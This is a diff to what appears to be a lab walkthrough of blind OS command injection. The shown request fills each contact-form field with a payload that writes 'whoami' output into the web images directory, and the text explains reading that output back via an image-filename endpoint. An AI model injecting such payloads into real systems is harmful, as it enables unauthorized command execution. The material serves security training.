@@ -46,7 +46,7 @@ Connection: close
 csrf=wnAcZp4tDvrgSYNqcJsurav2gF3XTHRj&name=;whoami+>+/var/www/images/whoami.txt;+#&email=;whoami+>+/var/www/images/whoami.txt;+#&subject=;whoami+>+/var/www/images/whoami.txt;+#&message=;whoami+>+/var/www/images/whoami.txt;+#
 ```
 
-Attempt to navigate to the photo. Notice that the photos of the products on the homepage are rendered as `img` tags whose `src` attributes are set to `/images?filename=$FILENAME`. By navigating to `/images?filename=whoami.txt`, it is possible to read the output of the command.
+Attempt to navigate to the output file at `/var/www/images`. Notice that the photos of the products on the homepage are rendered as `img` tags whose `src` attributes are set to `/image?filename=$FILENAME`. By navigating to `/images?filename=whoami.txt`, it is possible to read the output of the command.
 
 ```http
 GET /image?filename=whoami.txt HTTP/1.1
